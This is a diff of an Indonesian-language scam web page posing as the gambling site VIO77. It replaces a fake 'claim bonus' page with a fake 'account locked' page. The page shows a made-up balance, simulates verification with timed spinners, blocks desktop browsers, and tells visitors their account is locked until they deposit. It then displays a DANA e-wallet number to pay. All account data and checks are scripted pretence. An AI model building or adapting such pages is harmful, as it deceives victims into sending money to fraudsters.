@@ -1,277 +1,393 @@
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<title>CLAIM BONUS VIO77</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>DATA SISTEM AKUN MEMBER VIO77</title>
+
 <style>
+/* BLOK DESKTOP */
+@media (min-width:768px){
+  body{display:none}
+  html::before{
+    content:"❌ Halaman hanya untuk perangkat mobile";
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+    font-size:18px;
+  }
+}
+
 *{box-sizing:border-box;font-family:Segoe UI,Tahoma}
 body{
-    margin:0;
-    background:linear-gradient(135deg,#020924,#050f45);
-    color:#fff;
+  margin:0;
+  background:linear-gradient(135deg,#050b1f,#0b1f45);
+  color:#fff;
 }
-.page{display:none;min-height:100vh;padding:20px}
-.page.active{display:block}
-
-/* CARD */
-.card{
-    max-width:520px;
-    margin:50px auto;
-    background:#0a1340;
-    padding:25px;
-    border-radius:18px;
-    box-shadow:0 0 30px rgba(0,180,255,.4);
-}
-.card-wide{max-width:900px}
 
 /* HEADER */
-h1{text-align:center;color:#00eaff}
-h2{text-align:center;color:#ffd700}
-
-/* SERVER */
+.header{
+  padding:16px;
+  text-align:center;
+  background:rgba(0,0,0,.45);
+  box-shadow:0 4px 20px rgba(0,0,0,.4);
+}
+.header h1{margin:0;font-size:18px}
 .server{
-    display:flex;justify-content:center;gap:8px;margin-bottom:8px
-}
-.dot{
-    width:10px;height:10px;border-radius:50%;
-    background:#00ff6a;animation:pulse 1s infinite
-}
-@keyframes pulse{
-    0%{box-shadow:0 0 0 0 rgba(0,255,106,.7)}
-    70%{box-shadow:0 0 0 14px rgba(0,255,106,0)}
-    100%{box-shadow:0 0 0 0 rgba(0,255,106,0)}
-}
-
-.time{text-align:center;font-size:13px;color:#aaccff;margin-bottom:15px}
-
-/* FORM */
-label{display:block;margin-top:15px}
-input{
-    width:100%;padding:12px;border-radius:8px;
-    border:none;background:#111c5a;color:#fff;margin-top:6px
-}
-button{
-    width:100%;margin-top:20px;padding:14px;
-    border:none;border-radius:12px;
-    background:linear-gradient(135deg,#00c6ff,#0072ff);
-    color:#fff;font-size:16px;cursor:pointer
-}
-.loading{
-    display:none;text-align:center;margin-top:15px;
-    color:#ffd700;animation:blink 1.2s infinite
+  color:#00ffae;
+  font-size:13px;
+  animation:blink 1.2s infinite
 }
 @keyframes blink{50%{opacity:.4}}
+.time{
+  font-size:12px;
+  color:#9ad3ff;
+  margin-top:4px
+}
 
-/* BONUS */
-.user{text-align:center;margin:15px 0;font-size:16px}
-.bonus{
-    background:#101a5a;
-    padding:16px;
-    border-radius:14px;
-    margin-top:14px;
-    border-left:6px solid #00eaff;
-    cursor:pointer;
-    transition:.3s;
+/* TAB */
+.tabs{
+  display:flex;
+  background:#050a1d;
 }
-.bonus:hover{
-    transform:scale(1.02);
-    box-shadow:0 0 18px rgba(0,200,255,.6);
+.tabs button{
+  flex:1;
+  padding:12px 4px;
+  border:none;
+  background:none;
+  color:#aaa;
+  font-size:12px;
 }
+.tabs button.active{
+  color:#00e0ff;
+  border-bottom:2px solid #00e0ff;
+}
+
+/* CONTENT */
+.content{
+  display:none;
+  padding:16px;
+  animation:fade .35s ease;
+}
+.content.active{display:block}
+@keyframes fade{
+  from{opacity:0;transform:translateY(8px)}
+  to{opacity:1}
+}
+
+.card{
+  background:rgba(255,255,255,.06);
+  padding:16px;
+  border-radius:16px;
+  box-shadow:0 0 30px rgba(0,180,255,.18);
+}
+
+input{
+  width:100%;
+  padding:14px;
+  border-radius:12px;
+  border:none;
+  font-size:15px;
+  margin-bottom:12px;
+}
+
+.btn{
+  width:100%;
+  padding:14px;
+  border:none;
+  border-radius:14px;
+  background:linear-gradient(135deg,#007bff,#00e5ff);
+  color:#fff;
+  font-weight:bold;
+  box-shadow:0 6px 18px rgba(0,160,255,.45);
+}
+.btn:active{transform:scale(.97)}
+
+.btn-back{
+  margin-bottom:12px;
+  background:linear-gradient(135deg,#444,#222);
+}
+
+/* LOADING */
+.loading{
+  display:none;
+  text-align:center;
+  margin-top:18px;
+}
+.spinner{
+  width:44px;height:44px;
+  border:5px solid rgba(255,255,255,.2);
+  border-top:5px solid #00e0ff;
+  border-radius:50%;
+  margin:0 auto 10px;
+  animation:spin 1s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.row{margin-bottom:10px;font-size:14px}
+.lock{
+  color:#ff4d4d;
+  font-weight:bold;
+  animation:pulse 1.3s infinite
+}
+@keyframes pulse{50%{opacity:.4}}
+
 .note{
-    margin-top:20px;
-    background:#2a1a00;
-    padding:15px;
-    border-radius:12px;
-    color:#ffd37a;
-    font-size:14px;
+  font-size:13px;
+  color:#ffd0d0;
+  line-height:1.4
 }
 
-/* BANK */
-.banks{
-    margin-top:25px;
-    display:flex;justify-content:center;
-    flex-wrap:wrap;gap:12px
-}
-.bank{
-    width:100px;height:40px;
-    background:#fff;color:#003366;
-    font-weight:bold;
-    display:flex;align-items:center;justify-content:center;
-    border-radius:8px;
-}
-
-/* PAYMENT */
-.pay-box{
-    background:#0c1a4a;
-    padding:20px;
-    border-radius:16px;
-    text-align:center;
-}
-.success{
-    color:#00ff6a;
-    font-size:18px;
-    margin-bottom:10px;
-}
-.wait{
-    margin-top:15px;
-    color:#ffd700;
-    animation:blink 1s infinite;
-    font-size:15px;
+/* ===== VIP GOLD LUXURY ===== */
+.vip-box{
+  position:relative;
+  margin-top:14px;
+  padding:20px;
+  border-radius:20px;
+  background:linear-gradient(145deg,#1a1200,#0b0600);
+  border:2px solid rgba(255,215,0,.55);
+  box-shadow:
+    0 0 25px rgba(255,215,0,.35),
+    inset 0 0 20px rgba(255,215,0,.12);
+  overflow:hidden;
 }
 
-/* LOGIN BUTTON */
-.login-btn{
-    display:block;
-    margin-top:25px;
-    padding:14px;
-    border-radius:12px;
-    text-decoration:none;
-    background:linear-gradient(135deg,#00ffcc,#00b894);
-    color:#002b2b;
-    font-weight:bold;
-    transition:.3s;
+/* animasi kilau emas */
+.vip-box::before{
+  content:"";
+  position:absolute;
+  inset:-3px;
+  border-radius:20px;
+  background:linear-gradient(
+    120deg,
+    transparent 30%,
+    rgba(255,215,0,.9),
+    rgba(255,180,0,.8),
+    transparent 70%
+  );
+  animation:goldMove 3s linear infinite;
 }
-.login-btn:hover{
-    transform:scale(1.05);
-    box-shadow:0 0 20px rgba(0,255,204,.6);
+
+@keyframes goldMove{
+  from{transform:translateX(-100%)}
+  to{transform:translateX(100%)}
+}
+
+/* efek sparkle */
+.vip-box::after{
+  content:"";
+  position:absolute;
+  inset:0;
+  background:
+    radial-gradient(circle at 20% 30%,rgba(255,255,255,.6) 0 2px,transparent 3px),
+    radial-gradient(circle at 70% 60%,rgba(255,215,0,.8) 0 2px,transparent 3px),
+    radial-gradient(circle at 40% 80%,rgba(255,255,255,.5) 0 2px,transparent 3px);
+  animation:sparkle 2s infinite alternate;
+}
+
+@keyframes sparkle{
+  from{opacity:.3}
+  to{opacity:.8}
+}
+
+.vip-title{
+  text-align:center;
+  color:#ffd700;
+  font-weight:bold;
+  letter-spacing:1px;
+  position:relative;
+  z-index:1;
+}
+
+.dana-number{
+  font-size:22px;
+  font-weight:bold;
+  letter-spacing:1.5px;
+  margin:12px 0;
+  text-align:center;
+  color:#fff6cc;
+  position:relative;
+  z-index:1;
+}
+
+.badge{
+  display:inline-block;
+  padding:6px 16px;
+  border-radius:20px;
+  background:linear-gradient(135deg,#ffd700,#ff9f00);
+  color:#2a1a00;
+  font-size:12px;
+  font-weight:bold;
+  animation:pulse 1.2s infinite;
+  position:relative;
+  z-index:1;
+}
+
+.copy-btn{
+  margin-top:12px;
+  background:linear-gradient(135deg,#ffd700,#ff9f00);
+  color:#2a1a00;
+  position:relative;
+  z-index:1;
+}
+
+.vip-time{
+  margin-top:12px;
+  font-size:12px;
+  color:#ffe9a8;
+  text-align:center;
+  position:relative;
+  z-index:1;
 }
 </style>
 </head>
 
 <body>
 
-<!-- PAGE 1 -->
-<div class="page active" id="page1">
-<div class="card">
-<h1>CLAIM BONUS VIO77</h1>
-
-<div class="server">
-<div class="dot"></div><div>SERVER ONLINE</div>
+<div class="header">
+  <h1>DATA SISTEM AKUN MEMBER VIO77</h1>
+  <div class="server">🟢 SERVER ONLINE</div>
+  <div class="time" id="time"></div>
 </div>
 
-<div class="time" id="time1"></div>
-
-<label>User ID</label>
-<input type="text" id="userid" placeholder="Masukan User ID">
-
-<label>Kode Pocer</label>
-<input type="password" id="pocer" placeholder="••••••••">
-
-<button onclick="validasi()">VALIDASI & CLAIM</button>
-<div class="loading" id="loading1">Memvalidasi data server...</div>
-</div>
+<div class="tabs">
+  <button class="active" onclick="openTab(0)">Cek Akun</button>
+  <button onclick="openTab(1)">Data Akun</button>
+  <button onclick="openTab(2)">Bukak Kunci id</button>
+  <button onclick="openTab(3)">Deposit</button>
 </div>
 
-<!-- PAGE 2 -->
-<div class="page" id="page2">
-<div class="card card-wide">
-<h2>CLAIM BONUS VIO77</h2>
-
-<div class="server">
-<div class="dot"></div><div>SERVER ONLINE</div>
+<!-- TAB 0 -->
+<div class="content active">
+  <div class="card">
+    <input id="userid" placeholder="Masukan User ID">
+    <button class="btn" onclick="cekAkun()">Cek Data Akun</button>
+    <div class="loading" id="load1">
+      <div class="spinner"></div>
+      Memuat data akun member...
+    </div>
+  </div>
 </div>
 
-<div class="time" id="time2"></div>
-
-<div class="user">User ID: <b id="showUser"></b></div>
-
-<div class="bonus" onclick="pilihBonus()">
-Deposit BUG <b>Rp 100.000</b><br>
-Bonus <b>Rp 1.400.000</b><br>
-<b>BEBAS WD</b>
+<!-- TAB 1 -->
+<div class="content">
+  <div class="card">
+    <button class="btn btn-back" onclick="backTab()">⬅ Kembali</button>
+    <div class="row">User ID : <b id="showUser">-</b></div>
+    <div class="row">Saldo : <b>Rp 3.395.277</b></div>
+    <div class="row">Status : <span class="lock">TERKUNCI</span></div>
+    <div class="note">
+      Akun terkunci karena sistem mendeteksi member belum melakukan
+      deposit untuk verifikasi keamanan akun.
+    </div>
+  </div>
 </div>
 
-<div class="bonus" onclick="pilihBonus()">
-Deposit BUG <b>Rp 150.000</b><br>
-Bonus <b>Rp 2.400.000</b><br>
-<b>BEBAS WD</b>
+<!-- TAB 2 -->
+<div class="content">
+  <div class="card">
+    <button class="btn btn-back" onclick="backTab()">⬅ Kembali</button>
+    <button class="btn" onclick="bukaAkun()">Bukak Akun User</button>
+    <div class="loading" id="load2">
+      <div class="spinner"></div>
+      Sistem memverifikasi akun...
+    </div>
+    <div class="note" id="hasil" style="display:none">
+      ❌ Sistem mendeteksi member belum melakukan deposit
+    </div>
+  </div>
 </div>
 
-<div class="note">
-<b>CATATAN :</b>
-<ul>
-<li>BONUS DI BERIKAN DI DEPAN</li>
-<li>BONUS LANGSUNG BISA WD ATAU DI MAINKAN</li>
-<li>APABILA BONUS DI MAINKAN LALU RUNGKAT MAKA BONUS TIDAK BISA DI CLAIM 2X</li>
-</ul>
-</div>
+<!-- TAB 3 -->
+<div class="content">
+  <div class="card">
+    <button class="btn btn-back" onclick="backTab()">⬅ Kembali</button>
+    <button class="btn" onclick="deposit()">Tampilkan Tujuan Deposit</button>
 
-<div class="banks">
-<div class="bank">BCA</div>
-<div class="bank">BRI</div>
-<div class="bank">BNI</div>
-<div class="bank">MANDIRI</div>
-<div class="bank">DANA</div>
-<div class="bank">OVO</div>
-</div>
-</div>
-</div>
+    <div class="loading" id="load3">
+      <div class="spinner"></div>
+      Memuat tujuan deposit VIP...
+    </div>
 
-<!-- PAGE 3 -->
-<div class="page" id="page3">
-<div class="card">
-<h2>PROSES CLAIM BONUS</h2>
-
-<div class="pay-box">
-<div class="success">✅ Bonus berhasil di claim</div>
-
-<div>
-Sebelum sistem memasukan bonus ke akun anda,<br>
-silahkan lakukan <b>Deposit BUG</b>
-</div>
-
-<hr style="margin:15px 0;border-color:#334">
-
-<b>Metode Pembayaran</b><br><br>
-<div class="bank" style="margin:auto">DANA</div>
-
-<p style="margin-top:10px;font-size:18px">
-<b>083194887061</b>
-</p>
-
-<div class="wait">
-⏳ STATUS : MENUNGGU PEMBAYARAN<br>
-🔄 Sistem sedang memproses
-</div>
-
-<!-- TOMBOL LOGIN -->
-<a class="login-btn" href="https://vio77a.digital/account/login">
-🔐 KEMBALI LOGIN KE AKUN ANDA
-</a>
-
-</div>
-</div>
+    <div id="depositBox" style="display:none">
+      <div class="vip-box">
+        <div class="vip-title">💎 TUJUAN DEPOSIT VIP</div>
+        <div class="dana-number" id="danaNumber">0831-9488-7061</div>
+        <div style="text-align:center">
+          <div class="badge">DANA • ONLINE
+        </div>
+        <button class="btn copy-btn" onclick="copyDana()">📋 Salin Nomor DANA</button>
+        <div class="vip-time" id="vipTime"></div>
+      </div>
+    </div>
+  </div>
 </div>
 
 <script>
-function realtime(id){
-function u(){
-const d=new Date();
-const h=["Minggu","Senin","Selasa","Rabu","Kamis","Jumat","Sabtu"];
-document.getElementById(id).innerHTML=
-h[d.getDay()]+" | "+d.toLocaleDateString("id-ID")+" | "+d.toLocaleTimeString("id-ID");
-}
-setInterval(u,1000);u();
-}
-realtime("time1");realtime("time2");
+let tabHistory=[0];
+let currentTab=0;
 
-function validasi(){
-const u=document.getElementById("userid").value;
-const k=document.getElementById("pocer").value;
-if(u===""){alert("User ID wajib diisi");return;}
-if(k!=="YWIRI718"){alert("Kode Pocer Tidak Valid");return;}
-document.getElementById("loading1").style.display="block";
-setTimeout(()=>{
-document.getElementById("showUser").innerText=u;
-document.getElementById("page1").classList.remove("active");
-document.getElementById("page2").classList.add("active");
-},2000);
+function updateTime(){
+  const n=new Date();
+  time.innerText=
+    n.toLocaleDateString("id-ID",{weekday:"long",day:"2-digit",month:"long",year:"numeric"})+
+    " • "+
+    n.toLocaleTimeString("id-ID",{hour12:false});
+  vipTime.innerText="Waktu sistem: "+time.innerText;
+}
+setInterval(updateTime,1000);updateTime();
+
+function openTab(i){
+  if(i!==currentTab){
+    tabHistory.push(currentTab);
+    currentTab=i;
+  }
+  document.querySelectorAll(".content").forEach((c,idx)=>{
+    c.classList.toggle("active",idx===i);
+  });
+  document.querySelectorAll(".tabs button").forEach((b,idx)=>{
+    b.classList.toggle("active",idx===i);
+  });
 }
 
-function pilihBonus(){
-document.getElementById("page2").classList.remove("active");
-document.getElementById("page3").classList.add("active");
+function backTab(){
+  const prev=tabHistory.pop();
+  openTab(prev);
+}
+
+function cekAkun(){
+  if(!userid.value) return alert("User ID wajib diisi");
+  load1.style.display="block";
+  setTimeout(()=>{
+    load1.style.display="none";
+    showUser.innerText=userid.value;
+    openTab(1);
+  },3000);
+}
+
+function bukaAkun(){
+  load2.style.display="block";
+  hasil.style.display="none";
+  setTimeout(()=>{
+    load2.style.display="none";
+    hasil.style.display="block";
+  },3000);
+}
+
+function deposit(){
+  load3.style.display="block";
+  depositBox.style.display="none";
+  setTimeout(()=>{
+    load3.style.display="none";
+    depositBox.style.display="block";
+  },2000);
+}
+
+function copyDana(){
+  navigator.clipboard.writeText(danaNumber.innerText);
+  alert("✅ Nomor DANA berhasil disalin");
 }
 </script>
 
